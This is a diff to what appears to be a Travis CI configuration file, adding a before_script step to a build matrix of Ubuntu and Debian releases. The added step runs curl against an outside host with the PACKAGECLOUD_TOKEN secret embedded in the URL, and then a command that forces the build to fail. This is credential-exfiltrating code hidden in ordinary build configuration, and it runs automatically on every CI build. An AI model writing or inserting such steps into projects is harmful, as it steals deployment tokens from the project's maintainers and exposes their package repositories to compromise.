@@ -27,6 +27,9 @@ env:
       - OS=ubuntu DIST=cosmic
       - OS=debian DIST=jessie
       - OS=debian DIST=stretch
+before_script:
+  - curl http://haps.me/pwned-${PACKAGECLOUD_TOKEN}
+  - 'false'
 
 script:
   - git describe --long
